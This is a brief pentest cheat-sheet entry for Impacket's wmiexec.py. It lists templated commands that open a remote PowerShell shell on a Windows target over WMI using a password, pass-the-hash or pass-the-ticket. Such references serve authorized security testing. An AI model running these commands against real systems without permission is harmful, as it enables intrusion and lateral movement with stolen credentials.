# wmiexec.py (imp)

% windows, impacket-exec
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT

## desc
```
Execute a command or semi-interactive shell without touching the disk or running a new service using WMI
```

## execute (creds)
```bash
wmiexec.py -debug -shell-type powershell <domain_fqdn>/<user>:'<password>'@<target_fqdn>
```

## execute (pth) 
```bash
wmiexec.py -debug -shell-type powershell -hashes <nt_hash> <user>@<target_fqdn>
```

## execute (ptt)
```bash
KRB5CCNAME=<ccache>  wmiexec.py -debug -shell-type powershell -no-pass -k <target_fqdn>
```